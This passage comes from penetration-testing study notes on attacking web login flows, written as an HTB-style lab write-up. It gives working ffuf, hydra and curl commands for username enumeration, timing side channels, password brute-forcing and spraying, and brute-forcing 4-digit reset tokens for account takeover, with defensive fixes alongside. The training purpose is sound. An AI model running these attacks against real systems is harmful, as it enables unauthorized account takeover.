    - 15.8 [End-to-End Methodology Flow](#158-end-to-end-methodology-flow)

---

# 1. What is Authentication

---

## 1.1 Authentication vs Authorization

Authentication is defined in RFC 4949 as "the process of verifying a claim that a system entity or system resource has a certain attribute value." In plain terms, **authentication confirms who you are** — it verifies that an entity is genuinely who they claim to be. **Authorization** is different: it is "an approval that is granted to a system entity to access a system resource," meaning it decides **what you are allowed to do** once your identity is known. The two are easy to confuse but must be kept separate: authentication always comes *first* (prove identity), and authorization comes *after* (grant access based on that identity). This module focuses almost entirely on authentication; authorization is only touched on where the two overlap.

The most widespread authentication method in web applications is the **login form**, where users enter a username and password to prove their identity. You see login forms everywhere — email providers, online banking, HTB Academy. Authentication is the first line of defense against unauthorized access, so as web application penetration testers, our job is to verify it''s implemented securely. The rest of this module is a tour of techniques to bypass login forms and gain unauthorized access.

| | Authentication | Authorization |
|---|----------------|---------------|
| Question it answers | Who are you? | What can you do? |
| Requires | Credentials | Policies / permissions |
| Order | Happens first | Happens after authentication |

**More detail — why the distinction matters in practice.** Mixing up these two concepts leads to real bugs and real confusion in reports. A login bypass is an **authentication** failure (the app let someone in who shouldn''t be in). Accessing *another* user''s data *after* you''re already logged in is an **authorization** failure (the app let you do something your identity shouldn''t allow). Many findings in this module sit right on the boundary — for example, the `user_id` parameter bypass in section 11 starts as an authentication issue (accessing a protected page) but shades into an authorization issue (viewing an admin''s data). When you write up a finding, be precise about which one it is, because the fix differs: authentication bugs are fixed by verifying identity correctly, authorization bugs by checking permissions on every sensitive action. A single application almost always needs *both* done correctly, and attackers probe both in turn.

**More detail — authentication is only as strong as its weakest flow.** A login form might be bulletproof — strong passwords, MFA, rate limiting — yet the account still falls because the *password reset* flow, the *2FA* step, the *session handling*, or a *default admin account* is weak. This is the single most important mindset for the whole module: don''t fixate on the main login. Map **every** path that can establish or recover a session (login, registration, reset, "remember me", OAuth/SSO callbacks, API tokens) and test each one, because an attacker only needs one of them to be broken.

---

## 1.2 Common Authentication Methods

Authentication methods fall into three major categories, based on *what kind of proof* the user provides. Understanding these categories matters because each has different strengths, weaknesses, and attack vectors. The three are **knowledge** (something you know), **ownership** (something you have), and **inherence** (something you are). Most of this module targets knowledge-based authentication, because it is the most common and the easiest to attack, but knowing all three helps you reason about multi-factor systems and understand why certain factors are harder to compromise than others.

- **Knowledge-based** — relies on something the user *knows*: passwords, passphrases, PINs, or answers to security questions.
- **Ownership-based** — relies on something the user *has*: an ID card, a security token, or a smartphone running an authenticator app.
- **Inherence-based** — relies on something the user *is* or *does*: biometric factors like fingerprints, facial patterns, voice recognition, or signatures. These are tightly tied to the individual.

| Knowledge | Ownership | Inherence |
|-----------|-----------|-----------|
| Password | ID card | Fingerprint |
| PIN | Security Token | Facial Pattern |
| Answer to Security Question | Authenticator App | Voice Recognition |

**More detail — the attack angle for each category at a glance.** Knowing *how* each factor tends to fail tells you where to spend your time:

| Category | Typical weakness | Primary attack |
|----------|------------------|----------------|
| Knowledge (password, PIN, question) | Static, reusable, guessable, phishable | Brute-force, spraying, credential stuffing, OSINT on security answers |
| Ownership (token, phone, card) | Physical theft/cloning; weak OTP length; weak crypto | TOTP brute-force, SIM-swap, badge cloning, replay |
| Inherence (biometric) | Irreversible if leaked; spoofable sensors | Presentation attacks (fake fingerprint/face), stolen-template reuse |

The reason this module concentrates on **knowledge** factors is simple: they''re everywhere, they require no special hardware to attack, and the weaknesses (reuse, weak passwords, guessable answers) are rampant. Ownership and inherence raise the bar, which is exactly why MFA — combining categories — is such an effective defense, and why so much attacker effort goes into *bypassing* the second factor (section 6) rather than defeating it head-on.

**More detail — authentication protocols you''ll meet in the wild.** Beyond simple login forms, real applications often delegate or federate authentication. You don''t need to master these for this module, but recognizing them tells you where to look:

- **OAuth 2.0** — delegated *authorization* (and, loosely, "Login with Google/GitHub"). Flaws include open redirects on the `redirect_uri`, stealable `state`/`code`, and misused implicit flows.
- **SAML** — XML-based SSO common in enterprises. Classic bugs are signature-wrapping and unsigned-assertion acceptance.
- **OpenID Connect (OIDC)** — an identity layer on top of OAuth; issues ID tokens (JWTs).
- **JWT (JSON Web Tokens)** — self-contained signed tokens often used as session or API credentials. Watch for `alg:none`, unverified signatures, and weak signing secrets (section 12.2).

When a target uses one of these, the authentication bugs shift from "brute-force the form" to "abuse the protocol flow," but the mindset — find what the app trusts that you can control — is identical.

---

## 1.3 Single-Factor vs Multi-Factor Authentication

The number of *distinct* factors an authentication system requires determines how hard it is to defeat. **Single-factor authentication** relies on just one method — for example, password authentication relies solely on knowledge of the password, so it is single-factor. **Multi-factor authentication (MFA)** combines two or more methods from *different* categories, dramatically increasing security because an attacker must defeat all of them. For instance, requiring a password *and* a time-based one-time password (TOTP) combines knowledge (the password) with ownership (the TOTP device). When exactly two factors are required, MFA is commonly called **two-factor authentication (2FA)**.

The key nuance is that the factors should come from *different* categories to count as true MFA — two passwords are still just single-factor (two knowledge factors). This is why "password + TOTP" is strong (knowledge + ownership) while "password + security question" is weaker (both knowledge).

**More detail — common MFA bypass categories (preview of what attackers try).** MFA is strong, but implementations fail in recognizable ways. Keep this checklist in mind whenever you hit a second factor:

- **Brute-forcing the code** — short numeric OTPs with no submission limit (section 6). The fix is 6+ digits plus attempt limiting.
- **Missing enforcement on some endpoints** — the login requires 2FA, but an API route, a "remember me" path, or a legacy endpoint skips it. Test whether the post-password session can reach protected pages *without* completing 2FA.
- **Flawed verification state** — the app marks the session "password-ok" and separately "2fa-ok"; if the protected page only checks "password-ok", you bypass 2FA entirely (closely related to the direct-access bug in section 10).
- **Reusable / non-expiring codes** — a code that stays valid across many requests or long after it was issued.
- **Backup/recovery codes or "trust this device"** — weaker fallbacks that an attacker targets instead of the primary factor.
- **Response manipulation** — the 2FA response leaks success/failure in a way you can tamper with, or a `302` vs `200` reveals the outcome.

This module demonstrates the first one in depth; the others are the natural next things to probe once you understand the pattern.

---

### Documentation Example (CTF-style write-up)

> **Recon note:** Authentication surface overview for the target.
>
> - Login form at `/index.php` (knowledge-based, username + password).
> - 2FA enforced at `/2fa.php` after login (ownership-based TOTP) → combined = 2FA.
> - Password reset flow present (`/reset.php`, `/security_question.php`, `/reset_password.php`).
> - Session managed via `PHPSESSID` cookie.
>
> **Plan:** enumerate users → brute-force password → test 2FA strength → probe reset flow → inspect session tokens → test for direct-access / parameter bypasses.
>
> **Screenshot placeholder:** `[ Attach login + 2FA pages and the authentication map ]`

---

# 2. Attacks on Authentication

---

## 2.1 Attacking Knowledge-Based Authentication

Knowledge-based authentication is the most prevalent and, conveniently for an attacker, the easiest to attack — which is why this module focuses on it. Its fundamental weakness is its reliance on **static personal information** that can be obtained, guessed, or brute-forced. Because the "secret" (a password, PIN, or security answer) doesn''t change moment to moment, an attacker who captures or guesses it once can reuse it. As cyber threats have evolved, attackers have become skilled at exploiting these weaknesses through social engineering (tricking users into revealing secrets) and data breaches (harvesting secrets in bulk). The static, reusable nature of knowledge factors is what makes brute-forcing, password spraying, and credential stuffing so effective.

**More detail — three related but distinct attacks you''ll hear about.** These terms are often blurred together; knowing the difference sharpens your testing and your reports:

| Attack | What you vary | When to use it |
|--------|---------------|----------------|
| **Brute-force** | Many passwords against **one** username | You have a valid user and no lockout; try a wordlist of passwords. |
| **Password spraying** | **One** common password against **many** usernames | There *is* a lockout per account; one password (`Spring2026!`) across all users avoids tripping it. |
| **Credential stuffing** | **Leaked username:password pairs** from other breaches | You have a breach dump; users reuse passwords, so pairs that worked elsewhere often work here. |

Spraying and stuffing are the real-world heavyweights because they sidestep per-account lockouts and exploit password reuse — the single most reliable attack multiplier in practice. Whenever brute-force is blocked by a lockout, pivot to spraying (few passwords, many users, slowly) rather than giving up.

**More detail — a sensible spraying cadence.** The whole point of spraying is to stay *under* the lockout threshold, so pace it deliberately: pick one or two high-probability passwords (seasonal patterns like `Autumn2026!`, `Company@123`, or whatever fits the policy), try each against your *entire* list of valid usernames, then **wait** out the lockout window before the next password. Trying one password across 500 users trips no per-account counter (each account saw just one attempt), whereas 500 passwords against one user locks that account immediately. The trade-off is time — spraying is slow by design — but it''s often the only approach that works against a defended login, and it directly exploits the reality that in any large user base, *someone* is using the obvious password.

**More detail — the credential-stuffing reality.** Stuffing works because of the one behavior defenders can''t patch on their end: **people reuse passwords**. A dump of `email:password` pairs from an unrelated breach, replayed against your target, frequently lands valid logins with zero guessing — you''re not cracking anything, just reusing what already leaked. This is why unique passwords and MFA matter so much, and why "we hash our passwords strongly" doesn''t help if users reused a password that leaked in plaintext somewhere else.

---

## 2.2 Attacking Ownership-Based Authentication

Ownership-based authentication is inherently more resistant to many common cyber threats, including phishing and password-guessing, because physical items are far harder for an attacker to acquire or replicate than information. You can''t phish a hardware token out of someone''s pocket the way you can phish a password. However, ownership-based authentication has its own trade-offs: the **cost and logistics** of distributing and managing physical tokens can limit adoption, especially at large scale. More importantly for an attacker, these systems can be vulnerable to **physical attacks** such as theft or cloning of the object, as well as **cryptographic attacks** on the algorithm the device uses. A realistic example is cloning NFC badges in public places — on public transport or in cafés — where an attacker can get close enough to read and duplicate a victim''s badge.

**More detail — the web-app angle on ownership factors.** As a *web* penetration tester you rarely clone a physical badge, but the ownership factor still shows up as data your target handles. The common web-facing weaknesses are: **weak OTP length/validity** (the TOTP brute-force in section 6), **OTPs delivered over insecure channels** (SMS is interceptable/SIM-swappable), **replayable OTPs** (the same code accepted more than once), and **recovery paths that downgrade the factor** (a "lost my device? answer a question instead" flow that swaps a strong ownership factor for a weak knowledge one). So when you see an ownership factor, don''t try to defeat the hardware — attack the *implementation* around it: the code length, the rate limiting, the delivery channel, and the fallback flows.

---

## 2.3 Attacking Inherence-Based Authentication

Inherence-based (biometric) authentication offers convenience and a smooth user experience: no passwords to remember, no tokens to carry — just a fingerprint or facial scan. This streamlined process can reduce breaches caused by weak passwords or stolen tokens. However, biometric systems carry a unique and severe risk: they can be **irreversibly compromised** in a data breach. Unlike a password, you cannot *change* your fingerprint or face. A stark real-world case occurred in 2019, when threat actors breached a company building biometric smart locks, exposing all stored **fingerprints and facial patterns**, plus usernames, passwords, access grants, and registered users'' addresses. Had the locks used knowledge-based authentication, affected users could simply have changed their passwords — but biometric data cannot be reset, leaving those users permanently exposed. Biometric systems also raise privacy, data-security, and algorithmic-bias concerns that affect trust and adoption.

**More detail — the "you can''t change it" problem, concretely.** The 2019 smart-lock breach is the textbook cautionary tale precisely because of *irreversibility*. Think about the asymmetry: a leaked password is a 30-second fix (change it, and the old one is worthless). A leaked **fingerprint template** or **face embedding** can never be revoked — the user has ten fingers and one face for life. Once that biometric data is in an attacker''s hands (or a breach dump), it can potentially be reused anywhere that accepts the same biometric, forever. This is why security professionals argue biometrics are best used as a *convenience* factor layered on top of something revocable, never as the sole secret — and why storing raw biometric data (rather than a protected, non-reversible template) is considered a serious design flaw. As a tester, flag any system that stores or transmits raw biometric data, treats a biometric as a single factor, or lacks a revocation/fallback story.

---

### Documentation Example (CTF-style write-up)

> **Analysis note:** Factor-based risk assessment of the target''s auth.
>
> | Factor in use | Strengths | Attack vectors to test |
> |---------------|-----------|------------------------|
> | Password (knowledge) | Cheap, universal | Enumeration, brute-force, spraying, reset abuse |
> | TOTP (ownership) | Phishing-resistant | Weak code length, no rate limit on codes |
>
> **Notes:** Target relies on knowledge + ownership. No biometric factors present, so the irreversible-breach risk doesn''t apply here. Primary effort directed at the knowledge factor (password) and the TOTP implementation.
>
> **Screenshot placeholder:** `[ Attach factor assessment table ]`

---

# 3. Enumerating Users

---

## 3.1 User Enumeration Theory

User enumeration vulnerabilities occur when a web application responds **differently** to valid versus invalid inputs at authentication endpoints — most often in login, registration, and password-reset functions that key off a username. Developers frequently dismiss this, assuming usernames aren''t confidential, but usernames *can* be sensitive when they''re the primary identifier for authentication. Worse, users tend to reuse the same username across many services (web apps, FTP, RDP, SSH), so a username harvested from one place can unlock attacks elsewhere. Importantly, user enumeration is a *deliberate trade-off* in some apps: even mature software like WordPress allows it by default because telling a legitimate user "that username doesn''t exist" improves usability — but it helps attackers just as much. A chat app''s user search is another case where enumeration is essential to the feature — the same behavior is a *feature* in one context and a *vulnerability* in another, which is exactly why judgment matters when you report it. So enumeration isn''t always a vulnerability, but it should be avoided as a defense-in-depth measure where possible (for example, by authenticating with an email address instead of a username).

**More detail — where to hunt for enumeration beyond the login.** The login form is the obvious place, but the *same* differing-response flaw hides in several other functions, and these are often overlooked by developers:

- **Registration** — "That username/email is already taken" confirms an account exists.
- **Password reset** — "If that account exists we sent an email" (good) vs "No account with that email" (leaks). Also watch the *response time* and *response size* even when the text looks identical.
- **Login error wording** — "Unknown user" vs "Invalid credentials" (the classic in section 3.2).
- **Account/profile lookup or search** — a feature that lets you search users is enumeration by design.
- **Rate-limit or lockout behavior** — if a valid account gets locked after N tries but an invalid one never does, the lockout itself leaks validity.

Test *each* of these flows, because an app that fixed enumeration on the login often left it wide open on registration or reset.

**More detail — why usernames are worth harvesting.** Even though a username isn''t secret like a password, a confirmed list of valid usernames is the foundation for almost everything that follows in this module: it lets you brute-force passwords against *real* accounts (no wasted attempts), run **password spraying** across the whole user base, craft **targeted phishing**, and reuse the usernames against other services (SSH/FTP/RDP) where people reuse names. That leverage is why enumeration, despite being "low severity" on its own, is almost always the first step of a real attack chain.

---

## 3.2 Enumerating via Differing Error Messages

The simplest enumeration technique exploits **differing error messages** between valid and invalid usernames. If logging in with a non-existent username returns "Unknown user" while a valid username with a wrong password returns "Invalid credentials," that difference lets you distinguish real accounts from fake ones. Usernames are usually far simpler than passwords — rarely containing special characters unless they''re emails — so a username wordlist (like SecLists'' `xato-net-10-million-usernames.txt`) tests quickly. You automate this with `ffuf`, fuzzing the username field and filtering out the "invalid username" error so only valid accounts remain. The payoff is a narrowed, targeted list for the password-brute-force and password-spray attacks that follow.

**More detail — the enumeration mindset in one line.** You are looking for *any observable difference* between "this input corresponds to a real account" and "this one doesn''t." Usually that difference is the error text, but it can equally be the status code, the response size (even by a few bytes), a redirect that only happens for valid users, an extra header, or the response time. Run one valid and one invalid attempt side by side in Burp''s **Comparer**, and whatever field differs is your oracle — the signal you then automate with the matching `ffuf` filter.

**Step 1 — Observe the two different error messages** by logging in manually:

- Invalid username `abc` → `Unknown user.`
- Valid username `htb-stdnt` + wrong password → `Invalid credentials.`

**Step 2 — Enumerate valid usernames with ffuf,** filtering out the "Unknown user" response:

```bash
$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

**Flag-by-flag breakdown:**

- `-w .../xato-net-10-million-usernames.txt` — the username wordlist; each entry replaces `FUZZ`.
- `-u http://172.17.0.2/index.php` — the login endpoint.
- `-X POST` + `-H "Content-Type: ..."` — submit a form POST like the real login.
- `-d "username=FUZZ&password=invalid"` — `FUZZ` is the username; the password is deliberately wrong.
- `-fr "Unknown user"` — **filter by regex**: hide every response containing "Unknown user," so only valid usernames (which return "Invalid credentials") remain.

**Example result:** `FUZZ: consuelo` — a valid username, ready to target in the password phase.

**More detail — when regex filtering isn''t enough.** The `-fr` (filter by regex) flag matches on the response *body text*, which is the most reliable signal when valid and invalid users produce different messages. But sometimes the body is identical and only the **size**, **word count**, **line count**, or **status code** differs. ffuf gives you a filter/matcher for each of those, and knowing all of them means you can always find *some* dimension that separates valid from invalid:

| ffuf flag | Filters/matches on | Example |
|-----------|--------------------|---------|
| `-fr` / `-mr` | Response body regex | `-fr "Unknown user"` |
| `-fc` / `-mc` | Status code | `-fc 401` (hide 401s) |
| `-fs` / `-ms` | Response size (bytes) | `-fs 3271` (hide that size) |
| `-fw` / `-mw` | Word count | `-fw 754` |
| `-fl` / `-ml` | Line count | `-fl 103` |

The workflow is always: run once with no filter to learn what the *invalid* (majority) response looks like on each dimension, then filter that majority out so only the anomaly — the valid username — remains. A good habit is to add `-c` (colorized output) and `-v` (verbose, shows full URLs) while tuning filters so the one standout line is easy to spot.

**More detail — speed and stealth knobs.** On a 10-million-line username list, you''ll want to tune throughput and avoid tripping defenses: `-t <N>` sets the number of concurrent threads (default 40 — lower it to be gentle, raise it to go faster), `-p <sec>` adds a delay between requests (e.g. `-p 0.1`), and `-rate <N>` caps requests per second. These matter later when a target *does* have rate limiting (section 7).

---

## 3.3 User Enumeration via Side-Channel Attacks

Even when a web application returns the *same* response for valid and invalid usernames, you may still enumerate accounts through a **side channel** — extra information inferred from the response rather than its content. The most common side channel is **response timing**: the time it takes for the application to respond. If the app performs a database lookup or a password-hashing operation *only* for valid usernames, those requests may take measurably longer than requests for non-existent usernames. By timing many requests and watching for consistent differences, you can distinguish valid accounts even when the visible response is identical. Timing attacks are subtle and noisier than error-message enumeration, so they''re a fallback when the obvious method is blocked. (Timing-based enumeration is covered in depth in the Whitebox Attacks module.)

**More detail — how to actually measure the timing difference.** The signal is small and buried in network jitter, so you need many samples and statistics, not a single request. A practical approach:

- Send each candidate username many times (say 20–50) and record the response time for each.
- Compare the **median** (not the mean, which outliers skew) across usernames.
- A valid username that triggers an extra DB lookup or a password-hash computation (bcrypt/argon2 are deliberately slow) will show a consistently higher median.

You can capture timings with `curl`''s built-in timing output:

```bash
$ curl -s -o /dev/null -w "%{time_total}\n" \
  -X POST http://172.17.0.2/index.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=consuelo&password=invalid"
0.312
```

- `-o /dev/null` discards the body, `-w "%{time_total}"` prints just the total time. Loop this over your username list, average the results, and the slow outliers are your valid accounts.

**More detail — why hashing causes the timing gap.** A well-built app hashes the submitted password even for *invalid* usernames (to avoid exactly this side channel), so both paths take the same slow time. A naive app skips hashing when the username doesn''t exist — it returns early — so invalid usernames are *faster*. That early-return optimization is the bug. The defense is to always do the same work (a dummy hash comparison) regardless of whether the username exists, making the timing identical.

**More detail — practical cautions for timing attacks.** Timing signals are real but fragile, so treat them carefully:

- **Network noise dominates small differences.** Run the test from a host close to the target (low, stable latency) and take many samples; a difference of a few milliseconds is meaningless over a jittery internet path.
- **Use medians, discard outliers.** A single slow response (GC pause, a busy server) can masquerade as a signal; the median across dozens of requests is far more trustworthy.
- **Warm up first.** The very first requests may be slow (cold caches, lazy initialization); discard them.
- **Confirm, don''t conclude.** Treat a timing difference as a *lead*, then verify the candidate username through another channel (e.g. the reset flow) before relying on it.

Timing enumeration is a last resort for when the obvious error-message and response-property differences are absent — powerful in theory, but noisy and slow in practice.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Username enumeration via differing error messages on `/index.php`.
>
> **Reproduction:**
> ```bash
> # Invalid user -> "Unknown user."   Valid user -> "Invalid credentials."
> $ ffuf -w xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST \
>   -H "Content-Type: application/x-www-form-urlencoded" \
>   -d "username=FUZZ&password=invalid" -fr "Unknown user"
> # -> consuelo (valid)
> ```
>
> **Evidence / Notes:** The login endpoint discloses whether a username exists via distinct error strings. Harvested a valid username (`consuelo`) to seed password attacks. **Severity: Low–Medium** (enables targeted brute-force/spray). Fix: return a single generic error ("Invalid username or password") for all failures, or authenticate by email.
>
> **Screenshot placeholder:** `[ Attach both error messages + ffuf valid-user hit ]`

---

# 4. Brute-Forcing Passwords

---

## 4.1 Why Password Brute-Forcing Works

Once valid usernames are known, password-based authentication rests entirely on the password as the sole proof of identity — and passwords are plagued with weaknesses. The two big problems are **password reuse** and **weak passwords**. Reuse means one leaked password can unlock many of a user''s accounts, enabling *password spraying* (trying leaked passwords across many apps). Weak passwords — based on dictionary words, common phrases, or simple patterns — fall quickly to brute-force tools that systematically try combinations until one works. The feasibility of a brute-force attack comes down to two things: how many attempts you can make, and how long each takes. That is why a *good, targeted wordlist* is critical — it maximizes your chance of success per attempt.

---

## 4.2 Building a Policy-Matched Wordlist

A smart attacker tailors the wordlist to the target''s **password policy**. If the app requires (say) at least one uppercase letter, one lowercase letter, one digit, and a 10-character minimum, then any wordlist entry that doesn''t meet those rules is wasted — the user could never have set it. Filtering a massive list like `rockyou.txt` (over 14 million passwords) down to only policy-compliant entries can cut it by ~99%, from millions to a few hundred thousand, saving enormous time. You can do this with chained `grep` commands or a single `awk` one-liner.

**Step 1 — Check the raw wordlist size:**

```bash
$ wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
14344391 /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

**Step 2 — Filter to the policy (upper + lower + digit + ≥10 chars) with grep:**

```bash
$ grep ''[[:upper:]]'' rockyou.txt | grep ''[[:lower:]]'' | grep ''[[:digit:]]'' | grep -E ''.{10}'' > custom_wordlist.txt
$ wc -l custom_wordlist.txt
151647 custom_wordlist.txt
```

Each `grep` enforces one rule: an uppercase char, a lowercase char, a digit, then `.{10}` requires at least 10 characters. Chaining them keeps only passwords satisfying all four — a ~99% reduction.

**Step 3 — Or do it all in one awk command:**

```bash
$ awk ''length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/'' rockyou.txt > custom_wordlist.txt
```

`length($0) >= 10` enforces the length; the three regex tests enforce character classes — equivalent to the grep chain but in a single pass.

**More detail — why policy-matching matters so much.** Every password in your list that *can''t* satisfy the target''s policy is a guaranteed miss — the user was never allowed to set it. On a 14-million-line list, that''s millions of wasted requests, which on a slow or rate-limited login could mean *days* of pointless traffic. Trimming to the ~150,000 compliant passwords (a 99% cut) doesn''t lower your odds at all — every removed password was unusable anyway — it just makes the attack finish 100× faster and quieter. Always read the policy off the registration/password-change page first, then shape the wordlist to it.

**More detail — other wordlist-shaping tools.** `grep`/`awk` filtering is the quickest, but for building *targeted* lists consider: **`hashcat --stdout` with rules** to mutate a base list (append years, capitalize, leetspeak) into policy-compliant candidates; **`cewl`** to scrape a company website into a custom wordlist of org-specific words; and **`cupp`** to generate guesses from a person''s OSINT (name, pet, birth year). A small, well-targeted list often beats a giant generic one, especially against rate limits.

**More detail — reading a password policy correctly.** Policies are stated in different ways, so translate each rule into a filter precisely: "at least one uppercase" → `/[A-Z]/`; "at least one number" → `/[0-9]/`; "at least one special character" → `/[^a-zA-Z0-9]/`; "minimum 10 characters" → `length >= 10`; "must not contain the username" → drop lines containing the username. Miss a rule and you waste attempts on impossible passwords; add a rule the app doesn''t have and you *discard* passwords users might actually use. When in doubt, be slightly *looser* than the stated policy — it''s safer to test a few extra candidates than to exclude a valid one.

---

## 4.3 Brute-Forcing the Login

With a policy-matched wordlist and a known username (say `admin`), you brute-force the password by fuzzing the password field and filtering out the failure message. First intercept a login request to learn the exact POST parameter names and the error string returned on failure, then build the `ffuf` command around them. A successful login typically returns a different status (often a `302` redirect to a dashboard) or lacks the failure string, which is exactly what your filter isolates.

**Step 1 — Identify the failure message** by intercepting a failed login (here: the response contains "Invalid username").

**More detail — what a successful login looks like (so you know what to filter for).** Before fuzzing, do one *known-bad* login and note every property of the failure response; the success response will differ on at least one of these:

- **Status code** — failures often `200` (re-render the form); success often `302` (redirect to a dashboard).
- **`Location` header** — success redirects to `/admin.php` or `/dashboard.php`; failure doesn''t, or redirects back to `/index.php`.
- **`Set-Cookie`** — success issues/updates a session cookie; failure may not.
- **Body content** — failure contains the error string ("Invalid username"); success contains post-login content or is empty on a redirect.
- **Size / words / lines** — the success page is usually a different length than the error page.
- **Timing** — success may be slower (session setup, redirect).

Pick whichever property is cleanest and filter on it. The body string is most reliable when it exists; the `302` status is the next-best fallback.

**Step 2 — Brute-force the password with ffuf:**

```bash
$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" -fr "Invalid username"
```

**Flag-by-flag breakdown:**

- `-w ./custom_wordlist.txt` — the policy-matched password list; each entry replaces `FUZZ`.
- `-d "username=admin&password=FUZZ"` — fixed username `admin`, fuzzed password.
- `-fr "Invalid username"` — hide all failed attempts (which contain this string), so only the correct password shows.

**Example result:** `FUZZ: Buttercup1` with `Status: 302` — the correct password, letting you log in to `/admin.php`.

**More detail — reading the result.** Notice the successful hit shows `Status: 302` with `Size: 0` and a long `Duration` (e.g. `4764ms`), while failed attempts return `200` with the error page. That status change (`200` → `302`) is itself a reliable filter: if the body-based `-fr` ever misbehaves, you could instead match only redirects with `-mc 302`. The long duration on the correct password is also a side channel — successful logins often do extra work (set a session, redirect), so an unusually slow response can flag the right password even before you read the body.

**More detail — a complete worked command with tuning:**

```bash
$ ffuf -w ./custom_wordlist.txt \
  -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -fr "Invalid username" \
  -mc 200,302 -t 40 -c -v
```

- `-mc 200,302` — explicitly consider both the error page (200) and the success redirect (302) so nothing is dropped before the body filter runs.
- `-t 40` — 40 concurrent threads (default); reduce for stealth.
- `-c` — colorized output; `-v` — verbose, printing the full request for each hit.

**More detail — the hydra alternative.** `ffuf` is ideal for HTTP forms, but `hydra` is the classic login brute-forcer and is worth knowing for non-HTTP services (SSH, FTP, RDP) and for POST forms too. The equivalent POST-form attack looks like:

```bash
$ hydra -l admin -P ./custom_wordlist.txt 172.17.0.2 \
  http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username"
```

- `-l admin` — single username (`-L file` for a list).
- `-P ./custom_wordlist.txt` — password list.
- `http-post-form "path:body:failure_string"` — the path, the POST body with `^USER^`/`^PASS^` placeholders, and the failure string that marks a *wrong* attempt.

**More detail — the Burp Intruder alternative.** If you''re already working in Burp, **Intruder** does the same job without leaving the tool: capture the login request, send it to Intruder, mark the password value as the payload position (`§...§`), load your wordlist under Payloads, and run the attack. Sort the results by **status code** or **length** to spot the one response that differs (the success). Intruder is slower than `ffuf`/`hydra` in the free version (it''s deliberately throttled), so use it for small lists or when you need Burp''s request editing, and switch to `ffuf`/`hydra` for large wordlists. The concept is identical across all three tools: fix the parts you know, fuzz the unknown, and filter on the response property that separates success from failure.

**Note:** For deeper password-attack technique, see HTB Academy''s *Cracking Passwords with Hashcat*, *Password Attacks*, and *Login Brute Forcing* modules.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Weak admin password recoverable via brute-force (no rate limiting).
>
> **Reproduction:**
> ```bash
> # Tailor wordlist to policy (upper+lower+digit, >=10)
> $ awk ''length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/'' rockyou.txt > custom_wordlist.txt
>
> # Brute-force
> $ ffuf -w custom_wordlist.txt -u http://172.17.0.2/index.php -X POST \
>   -H "Content-Type: application/x-www-form-urlencoded" \
>   -d "username=admin&password=FUZZ" -fr "Invalid username"
> # -> Buttercup1  (302 redirect to /admin.php)
> ```
>
> **Evidence / Notes:** `admin` password `Buttercup1` recovered. No lockout or rate limit observed, so the full policy-filtered list could be tried. **Severity: High.** Fix: enforce rate limiting/lockout, MFA, and stronger password policy.
>
> **Screenshot placeholder:** `[ Attach ffuf 302 hit + authenticated dashboard ]`

---

# 5. Brute-Forcing Password Reset Tokens

---

## 5.1 Identifying Weak Reset Tokens

Most web apps offer a **password recovery** flow for users who forget their password, usually relying on a one-time **reset token** sent via email or SMS. The user presents that token to prove they control the account and set a new password. The danger is that a **weak reset token** — one that''s short, numeric, or predictable — can be brute-forced or guessed, letting an attacker reset *someone else''s* password and take over their account. Reset flows are multi-step and therefore error-prone. To assess token strength, you typically register an account, request a reset, and inspect the token. If the reset link looks like `.../reset_password.php?token=7351`, that 4-digit token has only 10,000 possible values — trivially brute-forceable.

**Example reset email excerpt:**

```txt
2. If the above link doesn''t work, copy and paste the following URL into your web browser:
   http://weak_reset.htb/reset_password.php?token=7351
```

Here the token `7351` lives in a GET parameter and is only 4 digits — a textbook weak token.

**More detail — what to inspect on a reset token before attacking it.** When you receive a real reset token, run through this quick analysis to judge its strength and plan the attack:

- **Length and character set** — 4 digits = 10,000 values (trivial). 32 hex chars = 128-bit (hopeless to brute-force). Count the characters and the alphabet.
- **Randomness** — request several resets for the same account and compare the tokens. If they increment, share a static prefix, or look sequential, they''re predictable (same analysis as session tokens in section 12).
- **Does it encode anything?** — try base64/hex-decoding it. Some "tokens" are just an encoded timestamp or `username+time`, which you can forge rather than brute-force.
- **Expiry** — the email here says 24 hours. A long window gives you plenty of time to brute-force; a 10-minute window + rate limiting is far safer.
- **Single-use?** — does the token stay valid after one use, or is it consumed? Reusable tokens are worse.
- **Where it''s delivered** — in the URL (leaks to logs/history/Referer) vs a POST body.

---

## 5.2 Attacking Weak Reset Tokens

Because a 4-digit token has just 10,000 possibilities, you can enumerate them all with `ffuf`. First build a zero-padded wordlist of every value from `0000` to `9999`, then fuzz the `token` parameter and filter out the "invalid token" response. If users are actively resetting passwords, you can catch *any* valid active token; to target a specific user, first trigger a reset for them so a token exists, then brute-force it. A valid token lets you load the reset page for that account and set a new password — full account takeover.

**Step 1 — Generate the token wordlist** (zero-padded 0000–9999):

```bash
$ seq -w 0 9999 > tokens.txt
$ head tokens.txt
0000
0001
0002
...
```

The `-w` flag pads all numbers to equal length by prepending zeros, so `1` becomes `0001` — essential for matching fixed-width tokens.

**Step 2 — Brute-force the reset token with ffuf:**

```bash
$ ffuf -w ./tokens.txt -u "http://weak_reset.htb/reset_password.php?token=FUZZ" -fr "The provided token is invalid"
```

**Flag-by-flag breakdown:**

- `-w ./tokens.txt` — all 10,000 candidate tokens; each replaces `FUZZ`.
- `-u "...?token=FUZZ"` — the token sits in a GET parameter, so it goes straight in the URL.
- `-fr "The provided token is invalid"` — hide invalid-token responses, leaving only valid ones.

**Example result:** `FUZZ: 6182` with `Status: 200` — a valid token. Visit `/reset_password.php?token=6182` to reset that account''s password and take it over.

**More detail — targeting a specific victim vs catching any reset.** There are two ways to run this attack, and the distinction matters for timing and for your report:

